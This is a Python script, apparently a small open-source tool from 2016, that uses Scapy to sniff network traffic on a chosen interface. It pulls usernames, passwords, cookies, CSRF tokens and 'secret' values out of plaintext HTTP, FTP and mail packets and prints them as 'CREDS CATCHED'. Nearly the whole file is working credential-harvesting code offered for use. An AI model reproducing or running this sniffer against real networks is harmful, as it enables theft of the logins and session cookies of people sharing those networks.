#!/usr/bin/python


# This is a HTTP packet sniffer, which extract credidentials and stuff
# Run the script as sudo (sudo python sniffhttp.py) and input required options
#
# TODO:
# * Implement domain filtering for ignore ads
#   domainFilterList = ['adzerk.net', 'adwords.google.com', 'googleads.g.doubleclick.net', 'pagead2.googlesyndication.com']
# * Dummy check on cookies
#   Is it a useless ad cookie
# * Save results to files
#   Save either creds or everything to logfile
# * Change name of variable post
#   post variable contains both GET and POST
# * Configure # comments on class bcolors
#   Comments don't match printed color
#
# LICENSE:
# MIT - (c) 2016 Thomas TJ (TTJ)
#


# LIBRARIES
import subprocess       # Check network devices
import sys              # Exit script
import os               # Clear screen
import re               # Find * in packet
import time             # Timestamp loggings
from scapy.all import sniff, IP, TCP, DNS, Raw      # Tools from scapy
# END LIBRARIES


# VARIABLES
gcookie = ""     # Global for not printing the same cookie multiple times
gsecret = ""    # Same for secret
global ignore
# END VARIABLES


# CODE MODULE    ##############################################################
def main_sniff(interface, pktfilter, onlycreds, hideempty, ignore):
    try:
        if pktfilter == "DNS":
            FILTER = "udp or port 53"
        elif pktfilter == "FTP":
            FILTER = "port 21"
        elif pktfilter == "ALL":
            FILTER = "udp or tcp"
        elif pktfilter == "POP":
            FILTER = "port 110"
        elif pktfilter == "HTTP":
            FILTER = "port 80 or 8080"
        elif pktfilter == "MAIL":
            FILTER = "port 25 or 110 or 143"
        else:
            print("Type not allow, using UDP or TCP.")
            FILTER = "udp or tcp"
            return

        print(
            "\n "
            + bcolors.c4
            + ("TIME: %-*s ID:%-*sPRO:%-*sSRC: %-*s DST: %-*s PORT: %-*s HOST:  TYPE:  PATH:" % (4, "", 5, "", 3, "", 16, "", 16, "", 5, ""))
            + bcolors.c0
            )
        while True:
            sniff(filter=FILTER, prn=callback, store=0, iface=interface)
    except KeyboardInterrupt:
        sys.exit()


def callback(pkt):
    if pkt.dport == 53 and pkt[IP].proto == 17:    # if pkt.dport == 53 and pkt[DNS].opcode == 0L and pkt[IP].proto == 17:
        return (
            ' ' + '[' + time.strftime("%H:%M:%S") + '] '
            + ("%-*s" % (6, str(pkt[IP].id)))
            + bcolors.c13
            + "  DNS   "
            + bcolors.c0
            + (" SRC: %-*s DST: %s" % (16, str(pkt[IP].src), str(pkt[DNS].qd.qname).replace("b'", "").replace("'", "")))
            )

    # MAIL
    # Capturing mail credidentials
    mailuserpass = ""
    if pkt.dport == 25 or pkt.dport == 110 or pkt.dport == 143:
        if pkt[TCP].payload:
            mail_packet = str(pkt[TCP].payload)
            # Only interested in USER and PWD
            if onlycreds == "y":
                if 'user' in mail_packet.lower() or 'pass' in mail_packet.lower():
                    return (
                        " [" + time.strftime("%H:%M:%S") + "] "
                        + ("%-*s" % (6, str(pkt[IP].id)))
                        + bcolors.c11
                        + "  POP  "
                        + bcolors.c0
                        + " "
                        + ("SRC: %-*s DST: %-*s" % (16, str(pkt[IP].src), 16, str(pkt[IP].dst)))
                        + " "
                        + "DATA:  "
                        + bcolors.c2
                        + mail_packet.replace("\n", ".")
                        + bcolors.c0
                        )

            if 'user' in mail_packet.lower() or 'pass' in mail_packet.lower():
                mailuserpass = ("DATA:  " + bcolors.c2 + mail_packet.replace("\n", " "))
            elif mail_packet:
                mailuserpass = ("DATA:  " + mail_packet.replace("\n", " "))
            else:
                try:
                    mailuserpass = ("DATA:  " + str(pkt[Raw].load).replace("\n", " "))
                except:
                    mailuserpass = ""

            return (
                " [" + time.strftime("%H:%M:%S") + "] "
                + ("%-*s" % (6, str(pkt[IP].id)))
                + bcolors.c11 + "  POP  " + bcolors.c0
                + " "
                + ("SRC: %-*s DST: %-*s" % (16, str(pkt[IP].src), 16, str(pkt[IP].dst)))
                + " "
                + mailuserpass
                + bcolors.c0
                )

    # FTP
    # Capturing FTP credidentials
    userpass = ""
    if pkt.dport == 21:
        if pkt[TCP].payload:
            ftp_packet = str(pkt[TCP].payload)
            # Only interested in USER and PWD
            if onlycreds == "y":
                if 'user' in ftp_packet.lower() or 'pass' in ftp_packet.lower():
                    return (
                        " [" + time.strftime("%H:%M:%S") + "] "
                        + ("%-*s" % (6, str(pkt[IP].id)))
                        + bcolors.c12 + "  FTP   " + bcolors.c0
                        + " "
                        + ("SRC: %-*s DST: %-*s" % (16, str(pkt[IP].src), 16, str(pkt[IP].dst)))
                        + " "
                        + "DATA:  "
                        + bcolors.c2 + ftp_packet.replace("\n", ".") + bcolors.c0
                        )

            # Want it all
            else:
                if 'user' in ftp_packet.lower() or 'pass' in ftp_packet.lower():
                    userpass = ("DATA: " + bcolors.c2 + ftp_packet.replace("\n", " "))
                elif ftp_packet:
                    userpass = ("DATA: " + ftp_packet.replace("\n", " "))
                else:
                    try:
                        userpass = ("DATA: " + ftp_packet.replace("\n", " "))
                    except:
                        userpass = ""

                return (
                    " [" + time.strftime("%H:%M:%S") + "] "
                    + ("%-*s" % (6, str(pkt[IP].id)))
                    + bcolors.c12
                    + "  FTP   "
                    + bcolors.c0
                    + " "
                    + ("SRC: %-*s DST: %-*s" % (16, str(pkt[IP].src), 16, str(pkt[IP].dst)))
                    + " "
                    + userpass
                    + bcolors.c0
                    )

    # HTTP
    # Capturing HTTP credidentials
    host = ""
    username = ""
    password = ""
    cookie = ""
    path = ""
    post = ""
    secret = ""
    csrf = ""
    raw = ""
    raw_dport = ""
    global gcookie
    global gsecret
    if True:        # if pkt.dport == 80 or pkt.dport == 8080:
        try:
            raw = str(pkt[Raw].show)
            raw_dport = str(pkt[TCP].dport)
        except:
            raw = ""

        if raw == "":
            return None

        # Get username
        if 'user' in raw:
            mu = re.search('user[A-Za-z0-9%_-]*=([A-Za-z0-9%_-]+)', raw, re.IGNORECASE)
            if mu:
                username = str(mu.group(1))

        # Get password
        if 'pass' in raw or 'pwd' in raw:
            mp = re.search('pass[A-Za-z0-9%_-]*=([A-Za-z0-9%_-]+)', raw, re.IGNORECASE)
            if mp:
                password = str(mp.group(1))
            else:
                mp = re.search('pwd[A-Za-z0-9%_-]*=([A-Za-z0-9%_-]+)', raw, re.IGNORECASE)
                if mp:
                    password = str(mp.group(1))
            if password.isspace():
                password = ""

        # Get path
        if raw:
            mpath = re.search('\\\\r\\\\n\\\\r\\\\n([A-Za-z0-9%\.=&_-]+)', raw)
            if mpath:
                path = "  PATH: " + str(mpath.group(1))

        # Get cookie
        if raw:
            mcookie = re.search('Cookie:\s([A-Za-z0-9%=&_-]+)\\\\r\\\\n', raw)
            if mcookie:
                cookie = "  COOKIE: " + str(mcookie.group(1))
                if cookie == gcookie:
                    cookie = ""
                else:
                    gcookie = cookie
            else:
                mcookie = re.search('Cookie:\s([A-Za-z0-9%=&_-]+);', raw)
                if mcookie:
                    cookie = "  COOKIE: " + str(mcookie.group(1))
                    if cookie == gcookie:
                        cookie = ""
                    else:
                        gcookie = cookie
            # Do a check for stupid cookies and ignore them
            # if 'Gdyn' or 'gscroll' in cookie:
            #    cookie = ""

        # Get host
        if raw:
            mhost = re.search('Host:\s([A-Za-z0-9%\.=&_-]+)\\\\r\\\\n', raw)
            if mhost:
                host = "  HOST: " + str(mhost.group(1))

        # Get POST / GET
        if raw:
            mpost = re.search('(POST.*[A-Za-z0-9%_-]+).HTTP', raw)
            if mpost:
                post = "  TYPE: " + str(mpost.group(1))
            else:
                mpost = re.search('(GET.*[A-Za-z0-9%_-]+).HTTP', raw)
                if mpost:
                    post = "  TYPE: " + str(mpost.group(1))

        # Get secret
        if raw:
            msecret = re.search('([A-Za-z0-9%=&_-]+secret[A-Za-z0-9%=&_-]+)', raw, re.IGNORECASE)
            if msecret:
                secret = "  SECRET: " + str(msecret.group(1))
                if secret == gsecret:
                    secret = ""
                else:
                    gsecret = secret

        # Get CSRF
        if raw:
            mcsrf = re.search('csrf[A-Za-z0-9%_-]*=([A-Za-z0-9%_-]+)', raw, re.IGNORECASE)
            if mcsrf:
                csrf = "  CSRF: " + str(mcsrf.group(1))

        if password:
            if onlycreds != "y":
                printablecon = (
                    '\n'
                    + ' '
                    + bcolors.c3 + '[' + time.strftime("%H:%M:%S") + ']' + bcolors.c0
                    + ' '
                    + bcolors.c2 + 'CREDS CATCHED:' + bcolors.c0
                    + '\n' + " [" + time.strftime("%H:%M:%S") + "] " + str(pkt[IP].id)
                    + '\n\t\t  ORIGIN:   ' + str(pkt[IP].src)
                    + '\n\t\t  SERVER:   ' + str(pkt[IP].dst)
                    + '\n\t\t  PORT:     ' + raw_dport
                    + bcolors.c2 + '\n\t\t  USERNAME: ' + username + bcolors.c0
                    + bcolors.c2 + '\n\t\t  PASSWORD: ' + password + bcolors.c0
                    + '\n\t\t  POST:     ' + post.replace("  TYPE: ", "")
                    + '\n\t\t  PATH:     ' + path.replace("  PATH: ", "")
                    + '\n\t\t  CSRF:     ' + csrf.replace("  CSRF: ", "")
                    + '\n\t\t  HOST:     ' + host.replace("  HOST: ", "")
                    + '\n\t\t  COOKIE:   ' + cookie.replace("  COOKIE: ", "")
                    + '\n\t\t  SECRET:   ' + secret.replace("  SECRET: ", "")
                    + '\n\n'
                    )

            # Only CREDS
            if onlycreds == "y":
                printablecon = (
                    '\n'
                    + ' '
                    + bcolors.c3 + '[' + time.strftime("%H:%M:%S") + ']' + bcolors.c0
                    + ' '
                    + bcolors.c2 + "CREDS CATCHED:" + bcolors.c0
                    + '\n ' + " [" + time.strftime("%H:%M:%S") + "] " + str(pkt[IP].id)
                    + '\n'
                    + bcolors.c2 + '\n\t\t  ORIGIN  : ' + str(pkt[IP].src) + bcolors.c0
                    + bcolors.c2 + '\n\t\t  USERNAME: ' + username + bcolors.c0
                    + bcolors.c2 + '\n\t\t  PASSWORD: ' + password + bcolors.c0
                    + '\n\t\t  Path:     ' + path
                    + '\n'
                    )

            return printablecon

        elif cookie or secret or csrf:
            return (
                ' '
                + bcolors.c3 + '[' + time.strftime("%H:%M:%S") + ']' + bcolors.c0
                + " "
                + ("%-*s  Other  SRC: %-*s DST: %-*s PORT: %-*s" % (6, str(pkt[IP].id), 16, str(pkt[IP].src), 16, str(pkt[IP].dst), 5, raw_dport))
                + host
                + post
                + path
                + bcolors.c2
                + cookie
                + secret
                + csrf
                + bcolors.c0
                )

        elif 'login' in post.lower():
            return (
                ' '
                + bcolors.c3 + '[' + time.strftime("%H:%M:%S") + ']' + bcolors.c0
                + " "
                + ("%-*s  Other  SRC: %-*s DST: %-*s PORT: %-*s" % (6, str(pkt[IP].id), 16, str(pkt[IP].src), 16, str(pkt[IP].dst), 5, raw_dport))
                + host
                + bcolors.c2
                + post
                + path
                + bcolors.c0
                )

        else:
            if ignore == "y":
                # Create for loop checking each user input ignore files instead of static
                if re.search('(\.jpg|\.js|\.css|\.jpeg|\.svg|\.png)', post, re.IGNORECASE) is not None:
                    return None

            if hideempty == "y":
                if post != "":
                    return (
                        bcolors.c9 + " [" + time.strftime("%H:%M:%S") + "] "
                        + ("%-*s  Other  SRC: %-*s DST: %-*s PORT: %-*s" % (6, str(pkt[IP].id), 16, str(pkt[IP].src), 16, str(pkt[IP].dst), 5, raw_dport))
                        + host
                        + post
                        + path
                        )
                else:
                    return None
            else:
                return (
                    bcolors.c9 + " [" + time.strftime("%H:%M:%S") + "] "
                    + ("%-*s  Other  SRC: %-*s DST: %-*s PORT: %-*s" % (6, str(pkt[IP].id), 16, str(pkt[IP].src), 16, str(pkt[IP].dst), 5, raw_dport))
                    + host
                    + post
                    + path
                    )
# END CODE MODULE #############################################################


# START COLOR CLASS ###########################################################
class bcolors:
    c0 = '\033[0m'   # 0}  WHITE
    c1 = '\033[31m'  # 1}  RED
    c2 = '\033[32m'  # 2}  YELLOW -> Green
    c3 = '\033[33m'  # 3}  PURPLE
    c4 = '\033[34m'  # 4}  CYAN -> Blue
    c5 = '\033[35m'  # 5}  MAGENT
    c6 = '\033[36m'  # 6}  CURL ____
    c7 = '\033[1m'   # 7}  WHITE LOW
    c8 = '\033[4m'   # 8}  WHITE HIGH
    c9 = '\033[0m'   # 9}  WHITE (FUCK)
    c10 = '\033[40m'  # 10} BACKGROUND GREY
    c11 = '\033[41m'  # 11} BACKGROUND RED
    c12 = '\033[42m'  # 12} BACKGROUND GREEN
    c13 = '\033[43m'  # 13} BACKGROUND YELLOW
# END COLOR CLASS #############################################################


# START SCRIPT ################################################################
os.system('clear')        # For Windows change to 'cls'
print("\n")
print("  | -> Author       : Thomas TJ 2016 (TTJ)")
print("  | -> Version      : 1.0")
print("  | -> Description  : HTTP sniffer")
print("  | -> Date created : 09/11/2016")
print("  | -> Date modified: 09/11/2016")
print("  | -> License      : MIT")
print("\n")
print(
    "   (filter) options"
    + "\n    -> [ALL]  Whatever"
    + "\n    -> [DNS]  Domains Name Service"
    + "\n    -> [FTP]  File Transfer Protocol"
    + "\n    -> [POP]  Post Office Protocol"
    + "\n    -> [HTTP] HTTP"
    + "\n    -> [MAIL] Mail (25, 110, 143)"
    + "\n" + bcolors.c0
    )
print("   Possible interfaces:")

Interfaces = subprocess.getoutput("netstat -i | awk '{print $1}'")
Interfaces = str(Interfaces)
Interfaces = Interfaces.replace("\n", ",")
Interfaces = Interfaces.replace("Kernel,Iface,", "")
Interfaces = Interfaces.split(",")
if len(Interfaces) >= 0:
    print("   " + str(Interfaces))
else:
    print("   -> No interfaces")

print("\n\n")

# @type  interface: str
# @param interface: Interface to monitor
interface = input(bcolors.c0 + "  Interface: " + bcolors.c4)
if not interface:
    print(bcolors.c2 + "  - Wrong input. You need to define an interface.")
    print("  Exiting")
    sys.exit()
if interface not in Interfaces:
    print(bcolors.c2 + "  - Interface not found.")
    print("  Exiting")
    sys.exit()

# @type  pktfilter: str
# @param pktfilter: Filter packets by xx
pktfilter = input(bcolors.c0 + "  Filter (std=ALL): " + bcolors.c4)
if not pktfilter:
    pktfilter = 'ALL'
elif pktfilter.lower() not in ('all', 'dns', 'ftp', 'pop', 'http', 'mail'):
    print(bcolors.c2 + "  - Wrong input. Using 'ALL'")
    pktfilter = 'ALL'

# @type  onlycreds: str
# @param onlycreds: Only print credidentials to screen.
onlycreds = input(bcolors.c0 + "  Only print credidentials (y/N): " + bcolors.c4)
if onlycreds.lower() not in ('y', 'n'):
    print(bcolors.c2 + "  - Wrong input - only 'y' and 'n' allowed. Using 'n'")
    onlycreds = 'n'

# @type  hideempty: str
# @param hideempty: Hide "empty" packets. Generate alot of noise.
hideempty = input(bcolors.c0 + "  Hide empty packets (Y/n): " + bcolors.c4)
if hideempty.lower() not in ('y', 'n'):
    print(bcolors.c2 + "  - Wrong input - only 'y' and 'n' allowed. Using 'y'")
    hideempty = 'y'

# @type  ignore: str
# @param ignore: Ignore packets which contain .jpeg, .jpg, .png, .js, etc..
ignore = input(bcolors.c0 + "  Hide js, jpg, etc. (Y/n): " + bcolors.c4)
if ignore.lower() not in ('y', 'n'):
    print(bcolors.c2 + "  - Wrong input - only 'y' and 'n' allowed. Using 'y'")
    ignore = 'y'


main_sniff(interface, pktfilter, onlycreds, hideempty, ignore)
